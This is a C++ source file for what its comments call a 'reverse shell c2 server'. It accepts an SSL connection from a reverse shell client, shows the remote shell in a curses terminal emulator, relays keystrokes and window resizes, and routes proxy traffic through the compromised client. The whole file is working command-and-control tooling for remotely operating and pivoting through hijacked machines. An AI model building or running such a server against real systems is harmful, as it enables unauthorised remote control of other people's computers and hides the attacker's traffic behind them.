////////////////////////////////////////////////////////////////////////////////
// server.cc
// author: jcramb@gmail.com

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <curses.h>
#include <unistd.h>
#include <errno.h>
#include <ctype.h>
#include <poll.h>
#include <pwd.h>

#include <cstdlib>
#include <csignal>
#include <cstring>
#include <climits>
#include <cstdio>

#include "core.h"
#include "vterm.h"
#include "ssl.h"
#include "proxy.h"

////////////////////////////////////////////////////////////////////////////////
// wrapper class for vt100 terminal emulator using modified libvterm

class terminal {
public:

    // ctors / dtors
    terminal() {}
    ~terminal() {}

    // tty emulator i/o
    int init(int * rows = NULL, int * cols = NULL);
    int get_key(char * buf, int len);
    int render(const char * buf, int len);
    void resize(int * rows = NULL, int * cols = NULL);
    void exit();
    
protected:
    WINDOW * wnd;
    vterm_t * vterm;
};

////////////////////////////////////////////////////////////////////////////////
// helper function to create window resize messages

message & mk_resize_msg(int rows, int cols) {
    static message msg(MSG_WNDSIZE, sizeof(int) * 2);
    memcpy(msg.body(), &rows, sizeof(rows)); 
    memcpy(msg.body() + sizeof(rows), &cols, sizeof(cols)); 
    return msg;
}

////////////////////////////////////////////////////////////////////////////////
// handle window resize signals

void handle_winch(int sig)
{
    endwin();
    refresh();
    clear();
    LOG(">> SIGWINCH\n");
}

////////////////////////////////////////////////////////////////////////////////
// run reverse shell c2 server

int main(int argc, char **argv) {
    terminal tty;
    ssl_transport ssl;
    transport & tpt = ssl;
    transport_proxy proxy;
    int read_count = 0;
    int write_count = 0;
    int proxy_count = 0;
    int rows, cols;

    // initialise debug log
    log_init(argv[0], LOG_FILE | LOG_ECHO);

    // set host port if required
    if (argc > 1) {
        ssl.setopt(SSL_OPT_PORT, argv[1]);
    }
    
    // initialise proxy from file
    proxy.init_from_file(".proxies");
    
    // wait for reverse shell to connect via SSL (blocking)
    if (tpt.init(TPT_SERVER) < 0) {
        LOG("fatal: failed to establish transport connection\n");
        exit(-1);
    }
    
    // setup tty emulation and retrieve size of terminal window
    tty.init(&rows, &cols);
    signal(SIGWINCH, handle_winch);
    
    // disable echo for logging since we're in a curses window now
    log_flags(LOG_FILE);

    // resize client shell to server terminal size
    LOG("info: sending resize to client (%dx%d)\n", rows, cols);
    tpt.send(mk_resize_msg(rows, cols));

    // start server loop
    int keycode;
    char buf[256];
    LOG("info: starting loop...\n");
    while (1) {
        
        // check for shell output from client shell (non-blocking)
        message msg;
        int bytes = tpt.recv(msg);
        if (bytes == TPT_CLOSE) {
            LOG("fatal: client disconnected\n");
            break;
        } else if (bytes == TPT_ERROR) {
            LOG("fatal: transport failure\n");
            break;
        } else if (bytes != TPT_EMPTY) {

            // handle message based on type
            switch (msg.type()) {

                case MSG_RVSHELL: {
            
                    // log output to file
                    LOG("RD: [%04d] %d bytes\n", read_count++, msg.body_len());
                    hexdump(msg.body(), msg.body_len());

                    // render output in tty emulator
                    tty.render(msg.body(), msg.body_len());
                    break;
                } 

                case MSG_PROXY_INIT:
                case MSG_PROXY_PASS:
                case MSG_PROXY_FAIL:
                case MSG_PROXY_DATA: 
                case MSG_PROXY_DEAD: {
                    LOG("PROXY: [%04d] %d bytes\n", proxy_count++, bytes);
                    hexdump(msg.body(), msg.body_len());
                    proxy.handle_msg(ssl, msg);
                    break;
                }
            }
        }

        // check for input from tty emulator (non-blocking)
        if ((keycode = tty.get_key(buf, sizeof(buf))) != ERR) {

            // log tty input to file
            if (isprint(keycode)) {
                LOG("WR: [%04d] %3d '%c'\n", write_count++, keycode, keycode);
            } else {
                LOG("WR: [%04d] %3d ''\n", write_count++, keycode);
            }

            // handle ncurses telling us about a resize
            if (keycode == KEY_RESIZE) {

                // first resize the terminal emulator
                int rows, cols;
                tty.resize(&rows, &cols);

                // tell the client about the resize
                LOG("info: sending resize to client (%dx%d)\n", rows, cols);
                tpt.send(mk_resize_msg(rows, cols));      

            } else {

                // send tty input to client shell
                message msg(MSG_RVSHELL, strlen(buf));
                memcpy(msg.body(), buf, strlen(buf));
                tpt.send(msg);
            }
        }

        // handle proxy traffic routing
        proxy.poll(ssl);
    }

    // tear down terminal emulation and reset window
    tty.exit();
    LOG("info: server shutdown\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// setup tty emulation in curses window

int terminal::init(int * in_rows, int * in_cols) {

    // setup ncurses
    initscr();
    start_color();
    use_default_colors();
    noecho();
    raw();
    nodelay(stdscr, TRUE);
    keypad(stdscr, TRUE);

    // get terminal size
    int rows, cols;
    getmaxyx(stdscr, rows, cols);
    if (in_rows != NULL) *in_rows = rows;
    if (in_cols != NULL) *in_cols = cols;
    LOG("info: max tty size is %dx%d\n", rows, cols);

    // create ncurses window
    wnd = newwin(rows, cols, 0, 0);
    wrefresh(wnd);

    // create terminal emulator
    vterm = vterm_create(cols, rows, 0); //VTERM_FLAG_VT100);
    vterm_wnd_set(vterm, wnd);
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// translate keycodes as required for terminal emulation 
// TODO: make this use libvterm's translation to support rxvt / vt100

int terminal::get_key(char * buf, int len) {
    memset(buf, 0, len);
    int ch = getch();
    if (0) { // vt100 rendering
        switch (ch) {
            case '\n':           strcpy(buf, "\r");      break;
            case KEY_UP:         strcpy(buf, "\e[A");    break;
            case KEY_DOWN:       strcpy(buf, "\e[B");    break;
            case KEY_RIGHT:      strcpy(buf, "\e[C");    break;
            case KEY_LEFT:       strcpy(buf, "\e[D");    break;
            case KEY_BACKSPACE:  strcpy(buf, "\b");      break;
            case KEY_IC:         strcpy(buf, "\e[2~");   break;
            case KEY_DC:         strcpy(buf, "\e[3~");   break;
            case KEY_HOME:       strcpy(buf, "\e[7~");   break;
            case KEY_END:        strcpy(buf, "\e[8~");   break;
            case KEY_PPAGE:      strcpy(buf, "\e[5~");   break;
            case KEY_NPAGE:      strcpy(buf, "\e[6~");   break;
            case KEY_SUSPEND:    strcpy(buf, "\x1A");    break; // ctrl-z
            case KEY_F(1):       strcpy(buf, "\e[[A");   break;
            case KEY_F(2):       strcpy(buf, "\e[[B");   break;
            case KEY_F(3):       strcpy(buf, "\e[[C");   break;
            case KEY_F(4):       strcpy(buf, "\e[[D");   break;
            case KEY_F(5):       strcpy(buf, "\e[[E");   break;
            case KEY_F(6):       strcpy(buf, "\e[17~");  break;
            case KEY_F(7):       strcpy(buf, "\e[18~");  break;
            case KEY_F(8):       strcpy(buf, "\e[19~");  break;
            case KEY_F(9):       strcpy(buf, "\e[20~");  break;
            case KEY_F(10):      strcpy(buf, "\e[21~");  break;
            default:
                buf[0] = ch;
        }
    } else { // rxvt rendering
        switch (ch) {
            case '\n':           strcpy(buf, "\r");      break;
            case KEY_UP:         strcpy(buf, "\e[A");    break;
            case KEY_DOWN:       strcpy(buf, "\e[B");    break;
            case KEY_RIGHT:      strcpy(buf, "\e[C");    break;
            case KEY_LEFT:       strcpy(buf, "\e[D");    break;
            case KEY_BACKSPACE:  strcpy(buf, "\b");      break;
            case KEY_IC:         strcpy(buf, "\e[2~");   break;
            case KEY_DC:         strcpy(buf, "\e[3~");   break;
            case KEY_HOME:       strcpy(buf, "\e[7~");   break;
            case KEY_END:        strcpy(buf, "\e[8~");   break;
            case KEY_PPAGE:      strcpy(buf, "\e[5~");   break;
            case KEY_NPAGE:      strcpy(buf, "\e[6~");   break;
            case KEY_SUSPEND:    strcpy(buf, "\x1A");    break; // ctrl-z
            case KEY_F(1):       strcpy(buf, "\e[11~");  break;
            case KEY_F(2):       strcpy(buf, "\e[12~");  break;
            case KEY_F(3):       strcpy(buf, "\e[13~");  break;
            case KEY_F(4):       strcpy(buf, "\e[14~");  break;
            case KEY_F(5):       strcpy(buf, "\e[15~");  break;
            case KEY_F(6):       strcpy(buf, "\e[17~");  break;
            case KEY_F(7):       strcpy(buf, "\e[18~");  break;
            case KEY_F(8):       strcpy(buf, "\e[19~");  break;
            case KEY_F(9):       strcpy(buf, "\e[20~");  break;
            case KEY_F(10):      strcpy(buf, "\e[21~");  break;
            case KEY_F(11):      strcpy(buf, "\e[23~");  break;
            case KEY_F(12):      strcpy(buf, "\e[24~");  break;
            default:
                buf[0] = ch;
        }
    }
    return ch;
}

////////////////////////////////////////////////////////////////////////////////
// emulate terminal functions and update curses window

int terminal::render(const char * buf, int len) {
    vterm_remote_read(vterm, buf, len);
    vterm_wnd_update(vterm);
    touchwin(wnd);
    wrefresh(wnd);
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// handle window resize messages from ncurses

void terminal::resize(int * in_rows, int * in_cols) {
    int rows, cols;
    getmaxyx(stdscr, rows, cols);
    vterm_resize(vterm, cols, rows);
    vterm_wnd_update(vterm);
    wrefresh(wnd);
    if (in_rows != NULL) *in_rows = rows;
    if (in_cols != NULL) *in_cols = cols;
}

////////////////////////////////////////////////////////////////////////////////
// clean up tty emulator / curses

void terminal::exit() {
    delwin(wnd);
    endwin();
}

////////////////////////////////////////////////////////////////////////////////
